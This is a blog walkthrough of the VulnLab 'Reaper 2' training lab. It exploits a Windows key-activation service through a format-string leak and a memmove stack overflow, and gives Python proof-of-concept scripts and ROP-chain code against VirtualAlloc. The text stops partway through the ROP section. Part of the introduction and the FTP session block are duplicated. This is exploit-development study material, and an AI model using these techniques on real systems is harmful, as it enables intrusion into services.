[Home](https://plackyhacker.github.io)

# VulnLab Reaper 2 Walkthrough

## Introduction

[Reaper](https://www.vulnlab.com/machines) was a lab recommended to me for my [OffSec Advanced Windows Exploitation (AWE)](https://www.offsec.com/courses/exp-401/) preperations. It was written by [xct](https://x.com/xct_de) and is part of the training and labs offered by [VulnLab](https://vunlab.com). The lab was rated **Insane** and included binary and kernel [Reaper 2](https://www.vulnlab.com/machines) was the second lab recommended to me for my [OffSec Advanced Windows Exploitation (AWE)](https://www.offsec.com/courses/exp-401/) preperations. It was written by [xct](https://x.com/xct_de) and is part of the training and labs offered by [VulnLab](https://vunlab.com). The lab was rated **Insane** and it didn't disappoint!.

# Reconnaissance

It's a vulnerable **lab**, you get nothing to start off. You have to find the binary you are going to exploit. I guess the intention wasn't for the student to know that the lab was a binary exploitation lab; this was recommended to me as OSEE prep so I knew up front there was going to be some binary exploitation! I started with an **nmap** scan to see what the attack surface was (and had a short nap whilst waiting for the results).

I am absolutely terrible at remembering IP addresses so I created a host entry in the `/etc/hosts` file for **reaper.vulnlab.local**:

```
nmap reaper.vulnlab.local -sV -T4 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-24 18:15 BST
Nmap scan report for 10.10.87.94
Host is up (0.040s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
4141/tcp open  oirtgsvc?
5040/tcp open  unknown
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

(omitted for brevity)

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 336.92 seconds
```

This output tells me a few things. Firstly, it's a Windows operating system; it's running IIS and Microsoft Terminal Services, yes look at me... l33t!

I can see an FTP service where I might find a binary file or something that might lead me to a binary file and an HTTP service which may allow me to download a binary file or lead me to finding a binary file. There is also two other interesting services running on ports **4141** and **5040**.

The service on **4141** outputs a fingerprint (which I have omitted) but this suggests a service that might be exploitable; it's a binary exploitation lab!

## FTP

I connected to the FTP service; I was looking for a binary file after all. As sure as bears crap in the woods there was a binary file, and another file:

```
ftp reaper.vulnlab.local                                   
Connected to reaper.vulnlab.local.
220 Microsoft FTP Service
Name (reaper.vulnlab.local:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||5001|)
125 Data connection already open; Transfer starting.
08-15-23  12:12AM                  262 dev_keys.txt
08-14-23  02:53PM               187392 dev_keysvc.exe
226 Transfer complete.
```

I downloaded the two files (using FTP binary mode) and took a look at the `.txt` file first:



```
ftp reaper.vulnlab.local                                   
Connected to reaper.vulnlab.local.
220 Microsoft FTP Service
Name (reaper.vulnlab.local:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||5001|)
125 Data connection already open; Transfer starting.
08-15-23  12:12AM                  262 dev_keys.txt
08-14-23  02:53PM               187392 dev_keysvc.exe
226 Transfer complete.
```

I downloaded the two files (using FTP binary mode) and took a look at the `.txt` file first:

```
cat dev_keys.txt          
Development Keys:

100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl

The dev keys can not be activated yet, we are working on fixing a bug in the activation function.
```

Oh, I love a careless developer storyline! That comment warms my heart. It suggests that there is a bug in the activation function; if there is a bug, then maybe it can be exploited for remote code execution.

I looked at the binary next:

```
file dev_keysvc.exe     
dev_keysvc.exe: PE32+ executable (console) x86-64, for MS Windows, 7 sections
```

Nothing surprising here.

> **NOTE**
>
> The **HTTPS** service had the default **IIS** webpage. Yes I know I could have fuzzed it, but we all know I have the exploitable binary!
>
> The **RDP** service was also available but of course I didn't have any credentials.

## Portable Executable File

I wanted to gather some basic information about the portable executable file. Is it 32 bit or 64 bit? Does it have any compiled security mitigations, such as ASLR? It probably has, and DEP will be enabled, they don't mark this lab as **insane** for nothing!

At this point I had to switch to a Windows 11 machine. I ran the PE file and examined the binary in **Process Hacker 2**:

![image](https://github.com/user-attachments/assets/2ba684d4-fce7-4682-b58a-2598b2c8048f)

So, at this point I had a vulnerable 64-bit binary, running as a service on the target (port 4141), and it has DEP and ASLR mitigations in place.

# Reverse Engineering

I had a couple of things to go on when I started reverse engineering the binary; first, the service listens for connections so it most likely uses the `WS2_32 recv` function, or something similar. Secondly, the comment found in the file gave me a clue (I thought that if this is a rabbit hole I will sulk for quite a while):

```
The dev keys can not be activated yet, we are working on fixing a bug in the activation function.
```

My strategy at this point was to analyse the code flow, using dynamic and static analysis. I planned to start with a breakpoint on the `recv` function and see if I could direct the code flow to an **activation** function. I would use **Windbg Preview** and **IDA Free**.

## Finding the recv Call

I loaded the binary up in **IDA Free** and **WinDbg Preview** and rebased the module address in **IDA** based upon the memory it was loaded into in **WinDbg**. I then set a breakpoint in **WinDbg** for the `recv` function:

```
bp ws2_32!recv
```

I connected to the running service using **telnet**:

```
telnet 192.168.1.145 4141       
Trying 192.168.1.145...
Connected to 192.168.1.145.
Escape character is '^]'.
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: TEST
```

And I got a breakpoint hit in **WinDbg**:

```
Breakpoint 0 hit
WS2_32!recv:
00007ff8`d9292280 48895c2408      mov     qword ptr [rsp+8],rbx ss:00000051`8d4ffd70=000001a32155ce80
```

I used the `k` command to display the call stack of the given thread (essentially telling me which address would be returned to following the call):

```
k
 # Child-SP          RetAddr               Call Site
00 00000051`8d4ffd68 00007ff7`19371100     WS2_32!recv
01 00000051`8d4ffd70 00007ff7`1937ed72     ReaperKeyCheck+0x1100
02 00000051`8d4ffdf0 00007ff8`d81d257d     ReaperKeyCheck+0xed72
03 00000051`8d4ffe20 00007ff8`d992aa68     KERNEL32!BaseThreadInitThunk+0x1d
04 00000051`8d4ffe50 00000000`00000000     ntdll!RtlUserThreadStart+0x28
```

This led me to the call within a much larger function. The call is shown below:

![image](https://github.com/user-attachments/assets/27c31af7-8e2f-4bd5-906a-22887455aceb)

## Functions

I already knew there was three different paths to take, based upon the input that could be sent from the client:

```
1. Set key
2. Activate key
3. Exit
```

My plan at this point was to examine this function to see if I could find any obvious vulnerabilities in the code by following these three paths, and to see if there were any other paths that could be taken; for example by entering something that wasn't 1, 2, or 3.

By connecting to the service, examining the flow in **IDA**, and sending it different messages I observed a high level flow as depicted below:

![image](https://github.com/user-attachments/assets/8dddad51-eb53-4df4-8174-c9d5e3105f21)

There was two functions being called that I needed to reverse engineer (three if I include the second function in Option 2). A master of reverse engineering I am not. This, as always, was going to be painful!

> **NOTE**
>
> `Checksum`, `CheckKeyFile`, and `Another` are names I gave the functions I discovered whilst reversing in **IDA**. 

I have included a grab of the service whilst connected via **netcat**:

```
nc 192.168.1.145 4141
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: 100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
Valid key format
Choose an option:
1. Set key
2. Activate key
3. Exit
2
Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License
Could not find key!
```

I also discovered you could enter any text for the key, provided the checksum was correct:

```
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: 100-FE9A1-500-A270-0102-any_old_text
Valid key format
```

# Vulnerability Hunting

> **NOTE**
>
> As I was looking for vulnerabilities I was using a combination of dynamic and static analysis, observing the service behaviour and pulling my hair out. I have documented my understanding of the vulnerabilities discovered and some of the things I did to discover them.

Whilst analysing the service I discovered that if you set a breakpoint before the call to `Checksum()`, `rdx` contained a pointer to the submitted key:

```
Breakpoint 1 hit
dev_keysvc+0x10f5:
00007ff7`193710f5 488b4c2428      mov     rcx,qword ptr [rsp+28h]
0:001> da rdx
00000210`5b500000  "100-FE9A1-500-A270-0102-U3RhbmRh"
00000210`5b500020  "cmQgTGljZW5zZQ==."
```

I also noticed the very same memory location was pointed to by `rdx` when calling the `CheckKeyFile()` function. This suggests that the desired functionality is to set a valid key with **option 1**, then activate that key (which is stored in memory from the previous call) with **option 2**:

```
Breakpoint 2 hit
dev_keysvc+0x11ca:
00007ff7`193711ca e841070000      call    dev_keysvc+0x1910 (00007ff7`19371910)
0:001> da rdx
00000210`5b500000  "100-FE9A1-500-A270-0102-U3RhbmRh"
00000210`5b500020  "cmQgTGljZW5zZQ==."
```

All dynamic analysis I carried out from this point forward involved setting a valid key, then activiating the key via a **netcat** connection.

> **IMPORTANT**
>
> It is important to note that all keys are **base64** decoded in memory. It will become clear why this is important in the next section. Essentially, anything I wanted copied in to memory needed to be **base64** encoded in my 'payload'.

## memmove

I noticed that there is a call to `memmove` in the `Another` function (which I know I have named appallingly). The output in **IDA** is shown below:

```
.text:00007FF7AEFA169D mov     r8, [rsp+0C8h+Size] ; Size
.text:00007FF7AEFA16A2 mov     rdx, [rsp+0C8h+Src] ; Src
.text:00007FF7AEFA16A7 mov     rcx, rax        ; Dest
.text:00007FF7AEFA16AA call    memmove         ;
```

In 64-bit calling convention `rcx` is the first parameter, `rdx` is the second parameter, and `r8` is the third parameter. We can look at the **C** declaration for `memmove` to confirm this:

```c
void *memmove(void *str1, const void *str2, size_t n)
```

The **C** parameters are as follows: `str1` is the destination, `str2` is the source, and `n` is the number of bytes to be copied.

## Dynamic Analysis of memmove

I carried out some dynamic analysis in the section of code that called the `memmove` function. Using a key of **100-FE9A1-500-A270-0102-VEVTVEtFWQ==** I noted that the destination buffer contained the string **TESTKEY**:

```
Breakpoint 0 hit
ReaperKeyCheck+0x16aa:
00007ff7`aefa16aa e8d1130000      call    ReaperKeyCheck+0x2a80 (00007ff7`aefa2a80)
0:008> da rcx
0000004e`9f9fe750  ""
0:008> da rdx
00000196`c26cbe50  "TESTKEY"
0:008> r r8
r8=0000000000000008
0:008> p
da 0000004e`9f9fe750
0000004e`9f9fe750  "TESTKEY"
```

There is nothing groundbreaking here, but it confirms where data is being copied from, to, and how big the copy is.

I carried out the same test but with a longer key of:

```
**100-FE9A1-500-A270-0102-QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ**:
```

```
0:008> da rdx
00000196`c26ccc60  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
00000196`c26ccc80  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
00000196`c26ccca0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
00000196`c26cccc0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
00000196`c26ccce0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
00000196`c26ccd00  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
00000196`c26ccd20  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
00000196`c26ccd40  "AAAA"
0:008> r r8
r8=00000000000000e4
0:008> p
ReaperKeyCheck+0x16af:
00007ff7`aefa16af 488d4c2440      lea     rcx,[rsp+40h]
0:008> da 0000004e`9f9fe750
0000004e`9f9fe750  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000004e`9f9fe770  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000004e`9f9fe790  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000004e`9f9fe7b0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000004e`9f9fe7d0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000004e`9f9fe7f0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000004e`9f9fe810  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000004e`9f9fe830  "AAAA"
0:008> k
 # Child-SP          RetAddr               Call Site
00 0000004e`9f9fe6e0 41414141`41414141     ReaperKeyCheck+0x16af
01 0000004e`9f9fe7b0 41414141`41414141     0x41414141`41414141
02 0000004e`9f9fe7b8 41414141`41414141     0x41414141`41414141
```

Interestingly, when I examined the call stack I had overridden the saved return address; I had a classic stack-based buffer overflow to deal with.

To understand why this occured I ran the same test again, but this time I looked at the location of the destination variable to that of the stack pointer, I observed it is very close in proximity:

```
Breakpoint 0 hit
ReaperKeyCheck+0x16aa:
00007ff7`aefa16aa e8d1130000      call    ReaperKeyCheck+0x2a80 (00007ff7`aefa2a80)
0:003> r rcx
rcx=000000d25f0fea90
0:003> r rsp
rsp=000000d25f0fea20
0:003> ?rcx-rsp
Evaluate expression: 112 = 00000000`00000070
```

I also examined the call stack **before** the **memmove** function was called:

```
0:003> k
 # Child-SP          RetAddr               Call Site
00 000000d2`5f0fea20 00007ff7`aefa193c     ReaperKeyCheck+0x16aa
01 000000d2`5f0feaf0 00007ff7`aefa11cf     ReaperKeyCheck+0x193c
```

I examined the destination variable on the stack:

```
0:003> dq rcx L14
000000d2`5f0fea90  00000000`00000000 00000000`00000000
000000d2`5f0feaa0  00000000`00000000 00000000`00000000
000000d2`5f0feab0  00000000`00000000 00000000`00000000
000000d2`5f0feac0  00000000`00000000 00000000`00000000
000000d2`5f0fead0  00000000`00000000 00000000`00000000
000000d2`5f0feae0  00000000`00000000 00007ff7`aefa193c
```

Finally, I examined the destination variable on the stack **after** the call to **memmove**: 

```
0:003> dq rcx L14
000000d2`5f0fea90  41414141`41414141 41414141`41414141
000000d2`5f0feaa0  41414141`41414141 41414141`41414141
000000d2`5f0feab0  41414141`41414141 41414141`41414141
000000d2`5f0feac0  41414141`41414141 41414141`41414141
000000d2`5f0fead0  41414141`41414141 41414141`41414141
000000d2`5f0feae0  41414141`41414141 41414141`41414141
```

I now knew that 96 bytes were all I needed to overwrite the saved return address.

The **memmove** function has a paramater to specificy the size of the buffer to be copied; I decided to understand why this had gone so very wrong.

The `size` variable was set to zero in the function:

```
.text:00007FF7AEFA15E4 mov     [rsp+0C8h+Size], 0
```

I set a breakpoint here and decided to watch that variable with a keen eye! When the breakpoint was hit I grabbed the memory location of the variable:

```
Breakpoint 0 hit
ReaperKeyCheck+0x15e4:
00007ff7`aefa15e4 48c744243000000000 mov   qword ptr [rsp+30h],0 ss:00000004`320feab0=0000000000000000
0:003> p
ReaperKeyCheck+0x15ed:
00007ff7`aefa15ed 488b4c2428      mov     rcx,qword ptr [rsp+28h] ss:00000004`320feaa8=0000019db7b70018
0:003> dq [rsp+30h] L1
00000004`320feab0  00000000`00000000
```

Stepping through the instructions I reached a further reference to the variable:

```
00007ff7`aefa15f7 4c8d442430      lea     r8,[rsp+30h]
0:003> p
ReaperKeyCheck+0x15fc:
00007ff7`aefa15fc 488bd0          mov     rdx,rax
0:003> r r8
r8=00000004320feab0
```

I was at a point where `r8` pointed to the `size` variable on the stack.

Next there was a call to another function:

```
.text:00007FF7AEFA1604 call    sub_7FF7AEFA12D0
```

When this function returned the value in `rax` pointed to my key but it had been **base64** decoded. I assumed that this was a **base64** decode function so I renamed it appropriately:

```
0:003> da rax
0000019d`b7bedef0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000019d`b7bedf10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000019d`b7bedf30  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000019d`b7bedf50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000019d`b7bedf70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000019d`b7bedf90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000019d`b7bedfb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0000019d`b7bedfd0  "AAAA"
```

There was another function call:

```
.text:00007FF7AEFA1616 call    sub_7FF7AEFA1700
```

This function took the entire input in the `rcx` register (only one parameter):

```
ReaperKeyCheck+0x1616:
00007ff7`aefa1616 e8e5000000      call    ReaperKeyCheck+0x1700 (00007ff7`aefa1700)
0:003> da rcx
0000019d`b7b70000  "100-FE9A1-500-A270-0102-QUFBQUFB"
0000019d`b7b70020  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
0000019d`b7b70040  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
0000019d`b7b70060  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
0000019d`b7b70080  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
0000019d`b7b700a0  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
0000019d`b7b700c0  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
0000019d`b7b700e0  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
0000019d`b7b70100  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
0000019d`b7b70120  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
0000019d`b7b70140  "QUFBQUFBQ."
```

The function returned the address of the byte (containing '-') before the start of the encoded key. Perhaps this function located the end of the checksum:

```
0:003> da rax
0000019d`b7b70017  "-"
```

Weirdly, the `size` variable now contained the value **e4**. This was the size of the key. I thought this was weird because this variable was not used as a parameter to the function call, nor was it returned in `rax`. At least I now knew that this `LocateCheckSumEnd` function also set the `size` variable used in the `memmove` call:

```
0:003> dq [rsp+30h] L1
00000004`320feab0  00000000`000000e4
```

As a side venture, whilst stepping through the code I noticed a call to `snprintf`:

```
.text:00007FF7AEFA165F call    snprintf
```

When I looked at the format string that was pointed to by `r8` I found the checksum:

```
0:003> da r8
0000019d`b7b70000  "100-FE9A1-500-A270-0102-"
```

This looked like a perfect opportunity to leak a memory address because I am allowed to input this, and in the instructions that followed I knew that the input was replayed back to the client (I had observed this when testing with **netcat**). I parked this until later.

I now had enough information to start exploiting the bug; but first I needed to write a proof of concept.

## Proof of Concept Code

After doing a bit of basic fuzzing with **python** I came up with the following proof of concept to start work with:

```python
#!/usr/bin/python
import socket, sys, base64
from struct import pack

try:
    server = sys.argv[1]
    port = 4141
   
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    # recv initial menu
    d = s.recv(1024)

    # send option 1 data
    s.send(b'1')
    d = s.recv(1024)

    # key
    buffer = b"A" * 88                  # padding
    buffer += b"B" * 8                  # saved return pointer
    key = base64.b64encode(buffer)

    # send key
    poc_str = b"100-FE9A1-500-A270-0102-" + key
    s.send(poc_str)

    # recv menu
    d = s.recv(1024)

    # send option 2 data
    s.send(b'2')

    s.close()

    print("Done!")
except socket.error:
    print("Could not connect!")
```

# Memory Leak

In order to overcome the ASLR mitigation I needed some way to leak a memory address in the PE module. If I could leak an offset to the module base I could use it to locate ROP gadgets within the PE module. I had already observed a call to `snprintf` earlier, now it was time to do a bit of dynamic analysis and see if I could replay a memory location back to the client.

Using **netcat** again to do a bit of dynamic analysis I set a breakpoint on the following call:

```
.text:00007FF7AEFA165F call    snprintf
```

I hit my first hurdle, of course it wasn't going to pass a checksum:

```
Enter a key: %p-FE9A1-500-A270-0102-
Invalid key format

Enter a key: 100-FE9A1-500-A270-%p-
Invalid key format
```

It was time to dive in to the code again and see if I could somehow manufacture a valid checksum.

I revisted the `Checksum` function and found the following code:

```
.text:00007FF7AEFA18CA lea     rcx, aDebugChecksumP ; "[Debug] Checksum Provided: %d\n"
.text:00007FF7AEFA18D1 call    sub_7FF7AEFA1590
.text:00007FF7AEFA18D6 mov     edx, [rsp+48h+var_20]
.text:00007FF7AEFA18DA lea     rcx, aDebugChecksumC ; "[Debug] Checksum Calculated: %d\n"
.text:00007FF7AEFA18E1 call    sub_7FF7AEFA1590
.text:00007FF7AEFA18E6 mov     eax, [rsp+48h+var_24]
```

My plan was to input the same checksum value **(%p-FE9A1-500-A270-0102-)** but see if I could steal a valid checksum from memory using dynamic analysis. I set a breakpoint on the `Checksum` function call.

I hit another problem, where the key had to be a certain length:

```
.text:00007FF7AEFA176E call    strlen
.text:00007FF7AEFA1773 cmp     rax, 17h
```

I adjusted my key to **%p1-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==**. This passed the first check and I was now able to use dynamic analysis to figure out what the checksum consisted of. As it turned out it was fairly simple.

I set a breakpoint on `.text:00007FF7AEFA18D1 call sub_7FF7AEFA1590`  because at this point `rdx` contained the checksum I had provided. I decided to send different checksums, but only change one value delimited by the '-' character on each iteration, the results I recorded are given below:

| Key Provided                                     | Checksum in `rdx` |
| ------------------------------------------------ | ----------------- |
| %p1-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ== | 66                |
| %p2-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ== | 66                |
| %p1-FE9A2-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ== | 66                |
| %p1-FE9A1-500-A271-0102-U3RhbmRhcmQgTGljZW5zZQ== | 66                |
| %p1-FE9A1-500-A270-0103-U3RhbmRhcmQgTGljZW5zZQ== | 67                |

I noticed that the checksum calculation seemed to be only recorded in the last 'field'. Perhaps I overcomplicated this; I now realised that **0x67** equals **0103**. I was now confident I could grab the actual checksum from memory and alter my submitted key with a valid checksum.

I sent **%p1-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==** again, but this time observed the checksum I sent, which should equal `0x66`, which it did:

```
0:003> g
Breakpoint 0 hit
ReaperKeyCheck+0x18ca:
00007ff7`aefa18ca 488d0d27ed0100  lea     rcx,[ReaperKeyCheck+0x205f8 (00007ff7`aefc05f8)]
0:003> r edx
edx=66
```

I then stepped through the code to observe what the checksum should be:

```
0:003> p
ReaperKeyCheck+0x18da:
00007ff7`aefa18da 488d0d37ed0100  lea     rcx,[ReaperKeyCheck+0x20618 (00007ff7`aefc0618)]
0:003> r edx
edx=9b
```

Wallop! I now had valid key with which I could possibly leak a memory address, I tested this with **%p1-FE9A1-500-A270-0155-U3RhbmRhcmQgTGljZW5zZQ==**:

```
Enter a key: %p1-FE9A1-500-A270-0155-U3RhbmRhcmQgTGljZW5zZQ==
Valid key format
Choose an option:
1. Set key
2. Activate key
3. Exit
```

I observed a valid key, and sent **option 2**:

```
2
Checking key: 00007FF7AEFC06601-FE9A1, Comment: Standard License
Could not find key!
Choose an option:
1. Set key
2. Activate key
3. Exit
```

I now had a memory leak of `00007FF7AEFC0660`. I calculated the offset of the memory leak from the module base address:

```
0:001> ?00007FF7AEFC0660-ReaperKeyCheck
Evaluate expression: 132704 = 00000000`00020660
```

> **TIP**
>
> What I learned from this exercise is that sometimes you don't have to spend a lot of time statically reverse engineering assembly code, such as the checksum instructions. By observing general purpose registers during dynamic analysis this gave me the information I needed.

## Proof of Concept Code 0x2

I updated my proof of concept code to include the memory leak, I also tidied up the code a bit to make it more usable:

```python
#!/usr/bin/python
import socket, sys, base64
from struct import pack

global server
global port
global s

def main():
    global server
    global port
    global s
    
    server = sys.argv[1]
    port = 4141

    print("REAPER PoC\n----------")
    print("[*] Connecting to: %s" % server)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    leaked_address = leak_address()
    print("[*] Leaked address: %s" % hex(int(leaked_address,16)))

    base_address = int(leaked_address, 16)- 0x20660
    print("[*] Module base address: %s" % hex(base_address))

    print("[*] Sending the exploit...")
    send_exploit()

    s.close()

def leak_address():
    # recv initial menu
    d = s.recv(1024)

    s.send(b'1')
    d = s.recv(1024)

    leak_str = b"%p1-FE9A1-500-A270-0155-U3RhbmRhcmQgTGljZW5zZQ=="
    s.send(leak_str)
    d = s.recv(1024)

    s.send(b'2')
    d = s.recv(1024)
    d = s.recv(1024)

    # it works OK!
    retn = d.decode('utf-8').split(':')[1][1:17]

    return retn

def send_exploit():
    global s
    s.send(b'1')
    d = s.recv(1024)

    # key
    buffer = b"A" * 88                  # padding
    buffer += b"B" * 8                  # saved return pointer

    # b64 encode it
    key = base64.b64encode(buffer)

    # send exploit
    poc_str = b"100-FE9A1-500-A270-0102-" + key
    s.send(poc_str)
    d = s.recv(1024)

    # trigger exploit
    s.send(b'2')
    d = s.recv(1024)
    d = s.recv(1024)

# start here
main()
```

Now it was time to tackle Data Execution Prevention with a ROP chain.

# Win32 API Addresses

When looking to write ROP chains I would generally look to call one of the following Windows APIs:

- `VirtualAlloc`
- `VirtualProtect`
- `WriteProcessMemory`

I opened the binary in **PE Bear** and noticed that the only API in the Import Address Table was `VirtualAlloc`. The syntax for `VirtualAlloc` is:

```c
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

> **NOTE**
>
> The Microsoft documentation states that `VirutalAlloc` "Reserves, commits, or **changes** the state of a region of pages in the virtual address space of the calling process. Memory allocated by this function is automatically initialized to zero".
>
> This means I could change the protection on the stack and make it executable without a call to `VirtualProtect`.

**PE Bear** also revealed that the address of `VirtualAlloc` in the IAT is at an offset of `0x20000` from the base address of the module. I confirmed this in **WinDBG**:

```
0:000> u poi(ReaperKeyCheck+0x20000)
KERNEL32!VirtualAllocStub:
00007ffa`090d3bf0 48ff2531110700  jmp     qword ptr [KERNEL32!_imp_VirtualAlloc (00007ffa`09144d28)]
```

> **TIP**
>
> A technique I have used often, when there is no entry in the IAT, is to find an instruction in the binary that makes a call to the Win32 API and dereference the memory offset that contains the address made by the call.

# ROP Gadgets

The target binary was a 64bit binary. Windows uses the x64 Application Binary Interface (ABI) calling convention. It is similar, but not to be confused with, the `__fastcall` calling convention. This means that the first four arguments for Win32 API function calls should be written to `rcx`, `rdx`, `r8`, and `r9` respectively. For `VirtualAlloc` this looks like the following:

- **lpAddress**; dynamically write the address of the stack into `rcx`.
- **dwSize**; write 0x1000, this is the default page size, into `rdx`.
- **flAllocationType**; write 0x1000, the code for MEM_COMMIT, into `r8`.
- **flProtect**; write 0x40, the code for PAGE_EXECUTE_READWRITE, into `r9`.

## RP++

I used **rp++** to locate all possible ROP gadgets in the binary:

```
.\rp-win.exe -r 5 -f .\dev_keysvc.exe --va 0x00 > ./rop_gadets.txt
```

[RP++]: https://github.com/0vercl0k/rp	"A fast ROP gadget finder"

## Notepad++

To locate usable gadgets I used the **notepadd++** application; I searched using regular expressions.

[Notepad++]: https://notepad-plus-plus.org/downloads/	"Downloads"

# ROP Chain

I spent several hours looking for decent ROP gadgets to build a chain that would change the page protection on the stack to `PAGE_EXECUTE_READWRITE`. I would then drop some shellcode on the stack and execute it. When I build ROP chains it takes a lot of effort, it's a bit like starting to build a jigsaw but later finding the pieces that did fit, no longer fit and you have to take a few steps back quite often to reach your goal. I have only documented the final ROP chain.

> **IMPORTANT**
>
> The order in which I populated the general purpose registers for the `VirtualAlloc` call is very important. Some ROP gadgets corrupt other registers as a residual consequence, and some are quite useful in moving values into other registers.

## lpAddress

I needed to get a reference to the stack into `rcx`. I noticed that when my ROP chain was hit that `r8` and `r11`, along with `rsp` already contained addresses on the stack:

```
rax=00000000ffffffff rbx=0000022515ceca00 rcx=e467870ae48d0000
rdx=0000000000000000 rsi=0000000000000000 rdi=4141414141414141
rip=00007ff6e5b116f1 rsp=000000abc94fe858 rbp=0000000000000000
 r8=000000abc94fe0c8  r9=0000000000000000 r10=0000000000000000
r11=000000abc94fe770 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
```

This was the easiest parameter to set, I moved the stack value in `r11` into `rax`, then moved that value in to `rcx`; job done (provided none of my other ROP chains corrupted `rcx`):

```python
# lpAddress rcx
# ---------------------------------------------------------------------------------
buffer += pack("<Q", base_address + 0x30f1)         # mov rax, r11 ; ret ;
# rax has a reference to the stack, need to get it in to rcx
buffer += pack("<Q", base_address + 0x1f80)         # mov rcx, rax ; ret ;
```

## flProtect

Next I moved the value of `0x40` into `r9`; this is the value `PAGE_EXECUTE_READWRITE`. The reason that `flPrtoect` parameter was populated next is that one of the ROP gadgets moves `0x0` in to `r8` which would nullify any value I had written in to the `flAllocationType` parameter in `r8`:

```python
# flProtect - r9
# ---------------------------------------------------------------------------------
buffer += pack("<Q", base_address + 0x1f5e7)        # pop rbx ; ret ;
buffer += pack("<Q", 0x40)                          # 0x40
buffer += pack("<Q", base_address + 0x1f90)         # mov r9, rbx ; mov r8, 0x0000000000000000 ; 
																										# add rsp, 0x08 ; ret ;
buffer += b"B" * 0x8                                # padding for add rsp, 0x08
```

> **NOTE**
>
> Another residual consequence of this gadget is `add rsp 0x08`. I needed to make sure I padded the stack whenever I saw this instruction.

## flAllocationType

